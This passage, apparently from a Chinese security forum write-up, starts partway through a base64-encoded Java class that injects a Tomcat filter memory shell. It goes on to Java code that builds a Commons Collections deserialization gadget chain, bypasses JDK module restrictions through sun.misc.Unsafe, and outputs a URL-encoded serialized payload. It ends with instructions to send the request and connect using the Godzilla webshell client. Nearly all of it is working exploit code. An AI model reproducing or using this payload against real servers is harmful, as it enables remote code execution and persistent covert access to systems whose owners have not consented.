daT290REdCeGF5a0tQVVVKc1c4OUVhNUpGL0FrMy9wdEZna056UDBrdnhDcmh4SFVWVkY1WkJZSm8yYVVsdVFmcm1YVnQ2R1k3aUxNMnM4QlhtWHo4Z2t3MzdNNVhNbmszVVgwMklQcS85SzdyWHpzUGZpQ3V4akRWekZwTDZhYmRBMWxOQkJHUWFsQktpbWt6SzdNSVFndmtRcHorQUFuaWVtdm94ZVlVTlVGS0JQVEVXQ211TENEVk9VNHFCS29wdUpHY2VvK3o0bVRDR2xPSEUvbysrazdCZ0djWnBwZFM5MnBIYlg0WEhLZjRDMmJXVnd6ekNKTk1weWtHTWoxM2p5YVFUaTdJdDRVQ0lRWncvaFlWbTNuSjJsWlRZVWlCSjhHVjloQnJuRWRId1ZYMlBlTkNyOGR3elROWWVDblVjMWZFUEQ0eHFlMFBDa2hxZVloY0F3RWFod29tMk4zUm9UOUx1dm9VakQwV0VHcXlDWGxHbXFOVENMQzFVT0Y3QlA4WXB5MnNsTzE4cGl2SktDaVQ2M3FGRmw3aFlyVTlYdGw5VXR5OTZxN3dxcnZ1djRPK0ZYa05KYTVSYXJiUS9LSkx0ZGNEeEtnaFJFdU1YYWJDbHBqTWlXb1FDN01nc2M1OHFnNGxxVzNuVmN2WjV3ZHdQaC8wWWl3azNxNkRaelg4TXlVYUVxZkRVMnFabU4rMTVScWVxL0dvMmlpb2NqWWJNdmN6MzBpZXBNMWZOKzY1V2xuVjNTdThSRnFXQ3NVU2pCc3h1NVk2MEw4WmFzQzFGa0JBdXhUcXdmd1FmQiswTFVadHFGQ2tVN2pyQWpXWTFCV3BoRGJNZ3dOaWsxUkNpMzJIZ0twVzZ4K1JRV242c2pFSm51dzBXUTlHSWU4Ri9SYnJ0MGRSa0FBQT09CAAXAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAZABoKABYAGwEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HAB4BAAZmaWx0ZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAdjb250ZXh0AQAIY29udGV4dHMBABBMamF2YS91dGlsL0xpc3Q7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAJExqYXZhL3V0aWwvTGlzdDxMamF2YS9sYW5nL09iamVjdDs+OwEADmphdmEvdXRpbC9MaXN0BwAnAQASamF2YS91dGlsL0l0ZXJhdG9yBwApAQANU3RhY2tNYXBUYWJsZQwAGQAdCgAEACwBAA9ieXBhc3NKREtNb2R1bGUMAC4AHQoAAgAvAQAKZ2V0Q29udGV4dAEAEigpTGphdmEvdXRpbC9MaXN0OwwAMQAyCgACADMBAAhpdGVyYXRvcgEAFigpTGphdmEvdXRpbC9JdGVyYXRvcjsMADUANgsAKAA3AQAHaGFzTmV4dAEAAygpWgwAOQA6CwAqADsBAARuZXh0AQAUKClMamF2YS9sYW5nL09iamVjdDsMAD0APgsAKgA/AQAJZ2V0RmlsdGVyAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAEEAQgoAAgBDAQAJYWRkRmlsdGVyAQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylWDABFAEYKAAIARwEABGtleTEBAAhjaGlsZHJlbgEAE0xqYXZhL3V0aWwvSGFzaE1hcDsBAANrZXkBAAtjaGlsZHJlbk1hcAEABnRocmVhZAEAEkxqYXZhL2xhbmcvVGhyZWFkOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAd0aHJlYWRzAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcAUwEAEGphdmEvbGFuZy9UaHJlYWQHAFUBABFqYXZhL3V0aWwvSGFzaE1hcAcAVwEAE2phdmEvdXRpbC9BcnJheUxpc3QHAFkKAFoALAEACmdldFRocmVhZHMIAFwBAAxpbnZva2VNZXRob2QBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwwAXgBfCgACAGABAAdnZXROYW1lDABiAAYKAFYAYwEAHENvbnRhaW5lckJhY2tncm91bmRQcm9jZXNzb3IIAGUBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAZwBoCgAWAGkBAAZ0YXJnZXQIAGsBAAVnZXRGVgwAbQBfCgACAG4BAAZ0aGlzJDAIAHAIAEoBAAZrZXlTZXQBABEoKUxqYXZhL3V0aWwvU2V0OwwAcwB0CgBYAHUBAA1qYXZhL3V0aWwvU2V0BwB3CwB4ADcBAANnZXQMAHoAQgoAWAB7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAB9AH4KAAQAfwEAD2phdmEvbGFuZy9DbGFzcwcAgQoAggBjAQAPU3RhbmRhcmRDb250ZXh0CACEAQADYWRkAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaDACGAIcLACgAiAEAFVRvbWNhdEVtYmVkZGVkQ29udGV4dAgAigEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsMAIwAjQoAVgCOAQAIdG9TdHJpbmcMAJAABgoAggCRAQAZUGFyYWxsZWxXZWJhcHBDbGFzc0xvYWRlcggAkwEAH1RvbWNhdEVtYmVkZGVkV2ViYXBwQ2xhc3NMb2FkZXIIAJUBAAlyZXNvdXJjZXMIAJcIACIBABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgcAmgEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgwAGQCcCgCbAJ0BACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgcAnwEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HAKEBACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uBwCjAQAJU2lnbmF0dXJlAQAmKClMamF2YS91dGlsL0xpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBABNqYXZhL2xhbmcvVGhyb3dhYmxlBwCnAQAJY2xhenpCeXRlAQACW0IBAAtkZWZpbmVDbGFzcwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAFY2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsMAK8AsAkAAgCxAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DACzALQKAFYAtQEADmdldENsYXNzTG9hZGVyDAC3AI0KAIIAuAwADgAGCgACALoBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHALwBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DAC+AL8KAL0AwAwAEQAGCgACAMIBAAxkZWNvZGVCYXNlNjQBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCDADEAMUKAAIAxgEADmd6aXBEZWNvbXByZXNzAQAGKFtCKVtCDADIAMkKAAIAyggAqwcAqgEAEWphdmEvbGFuZy9JbnRlZ2VyBwDOAQAEVFlQRQwA0ACuCQDPANEBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMANMA1AoAggDVAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwDXAQANc2V0QWNjZXNzaWJsZQEABChaKVYMANkA2goA2ADbAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsMAN0A3goAzwDfAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DADhAOIKANgA4wEAC25ld0luc3RhbmNlDADlAD4KAIIA5gEADWdldEZpbHRlck5hbWUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADGxhc3REb3RJbmRleAEAAUkBAAljbGFzc05hbWUBABJMamF2YS9sYW5nL1N0cmluZzsBAAEuCADuAQALbGFzdEluZGV4T2YBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkMAPAA8QoAFgDyAQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7DAD0APUKABYA9gEACWZpbHRlckRlZgEACWZpbHRlck1hcAEAAmUyAQAMY29uc3RydWN0b3JzAQAgW0xqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAAxmaWx0ZXJDb25maWcBAA1maWx0ZXJDb25maWdzAQAPTGphdmEvdXRpbC9NYXA7AQAOY2F0YWxpbmFMb2FkZXIBAA9maWx0ZXJDbGFzc05hbWUBAApmaWx0ZXJOYW1lAQAjW0xqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjwqPjsHAPwBABFnZXRDYXRhbGluYUxvYWRlcgwBBQCNCgACAQYMAOgA6QoAAgEIAQANZmluZEZpbHRlckRlZggBCgEAXShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzcztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAXgEMCgACAQ0BAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlckRlZggBDwEAB2Zvck5hbWUBAD0oTGphdmEvbGFuZy9TdHJpbmc7WkxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KUxqYXZhL2xhbmcvQ2xhc3M7DAERARIKAIIBEwEAL29yZy5hcGFjaGUudG9tY2F0LnV0aWwuZGVzY3JpcHRvci53ZWIuRmlsdGVyTWFwCAEVAQAkb3JnLmFwYWNoZS5jYXRhbGluYS5kZXBsb3kuRmlsdGVyRGVmCAEXAQAkb3JnLmFwYWNoZS5jYXRhbGluYS5kZXBsb3kuRmlsdGVyTWFwCAEZAQANc2V0RmlsdGVyTmFtZQgBGwEADnNldEZpbHRlckNsYXNzCAEdAQAMYWRkRmlsdGVyRGVmCAEfAQANc2V0RGlzcGF0Y2hlcggBIQEAB1JFUVVFU1QIASMBAA1hZGRVUkxQYXR0ZXJuCAElDAAFAAYKAAIBJwEAMG9yZy5hcGFjaGUuY2F0YWxpbmEuY29yZS5BcHBsaWNhdGlvbkZpbHRlckNvbmZpZwgBKQEAF2dldERlY2xhcmVkQ29uc3RydWN0b3JzAQAiKClbTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwwBKwEsCgCCAS0BAA1zZXRVUkxQYXR0ZXJuCAEvAQASYWRkRmlsdGVyTWFwQmVmb3JlCAExAQAMYWRkRmlsdGVyTWFwCAEzAQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IHATUKATYA2wEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwA5QE4CgE2ATkIAP4BAA1qYXZhL3V0aWwvTWFwBwE8AQADcHV0AQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAT4BPwsBPQFAAQAPcHJpbnRTdGFja1RyYWNlDAFCAB0KAB8BQwEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uBwFFAQAgamF2YS9sYW5nL0luc3RhbnRpYXRpb25FeGNlcHRpb24HAUcBAAFpAQAMZGVjb2RlckNsYXNzAQAHZGVjb2RlcgEAB2lnbm9yZWQBAAliYXNlNjRTdHIBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIIAU8MAREAvwoAggFRAQAMZGVjb2RlQnVmZmVyCAFTAQAJZ2V0TWV0aG9kDAFVANQKAIIBVgEAEGphdmEudXRpbC5CYXNlNjQIAVgBAApnZXREZWNvZGVyCAFaAQAGZGVjb2RlCAFcAQAOY29tcHJlc3NlZERhdGEBAANvdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQACaW4BAB5MamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbTsBAAZ1bmd6aXABAB9MamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW07AQAGYnVmZmVyAQABbgEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwFnAQAcamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbQcBaQEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtBwFrCgFoACwBAAUoW0IpVgwAGQFuCgFqAW8BABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMABkBcQoBbAFyAQAEcmVhZAEABShbQilJDAF0AXUKAWwBdgEABXdyaXRlAQAHKFtCSUkpVgwBeAF5CgFoAXoBAAt0b0J5dGVBcnJheQEABCgpW0IMAXwBfQoBaAF+AQADb2JqAQAJZmllbGROYW1lAQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEZ2V0RgEAPyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBhAGFCgACAYYBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcBiAoBiQDbCgGJAHsBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAYwBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAY8BkAoAggGRAQANZ2V0U3VwZXJjbGFzcwwBkwB+CgCCAZQKAY0AGwEADHRhcmdldE9iamVjdAEACm1ldGhvZE5hbWUBAAdtZXRob2RzAQAbW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwEACnBhcmFtQ2xhenoBABJbTGphdmEvbGFuZy9DbGFzczsBAAVwYXJhbQEAE1tMamF2YS9sYW5nL09iamVjdDsBAAZtZXRob2QBAAl0ZW1wQ2xhc3MHAZoBABJnZXREZWNsYXJlZE1ldGhvZHMBAB0oKVtMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwBpAGlCgCCAaYKANgAYwEABmVxdWFscwwBqQCHCgAWAaoBABFnZXRQYXJhbWV0ZXJUeXBlcwEAFCgpW0xqYXZhL2xhbmcvQ2xhc3M7DAGsAa0KANgBrgoAogAbAQAKZ2V0TWVzc2FnZQwBsQAGCgCgAbIKAJsAGwEACDxjbGluaXQ+CgACACwBAA9zdW4ubWlzYy5VbnNhZmUIAbcBAAl0aGVVbnNhZmUIAbkBAAlnZXRNb2R1bGUIAbsHAaABABFvYmplY3RGaWVsZE9mZnNldAgBvgEABm1vZHVsZQgBwAEAD2dldEFuZFNldE9iamVjdAgBwgEADmphdmEvbGFuZy9Mb25nBwHECQHFANEAIQACAAQAAAABAAIArwCwAAAAEQABAAUABgABAAcAAAAtAAEAAQAAAAMSDbAAAAACAAgAAAAGAAEAAAAdAAkAAAAMAAEAAAADAAoACwAAAAEADgAGAAEABwAAABAAAQABAAAABBMAELAAAAAAAAEAEQAGAAIAEgAAAAQAAQ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";
        byte[] data=Base64.getDecoder().decode(shellinject);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(MethodHandles.class),
                new InvokerTransformer("getDeclaredMethod", new
                           Class[]{String.class, Class[].class}, new Object[]{"lookup", new
                        Class[0]}),
                new InvokerTransformer("invoke", new Class[]
                        {Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("defineClass", new Class[]
                        {byte[].class}, new Object[]{data}),
                new InstantiateTransformer(new Class[0], new
                        Object[0]),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new
                Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        innerMap.remove("keykey");

        setFieldValue(transformerChain,"iTransformers",transformers);
        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(serialize(expMap))));
    }

    private static void patchModule(Class classname){
        try {
            Class UnsafeClass=Class.forName("sun.misc.Unsafe");
            Field unsafeField=UnsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe=(Unsafe) unsafeField.get(null);
            Module ObjectModule=Object.class.getModule();

            Class currentClass=classname.getClass();
            long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            unsafe.getAndSetObject(currentClass,addr,ObjectModule);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) {
        try {
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static byte[] serialize(Object object) {
        try {
            ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(object);
            objectOutputStream.close();
            return byteArrayOutputStream.toByteArray();
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

}

```

发包进行测试

​![image-20240829040603-e8jor4b](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-dba1405cb71a28296ded57438e397609509bc738.png)​

拿原始GodZilla连接即可

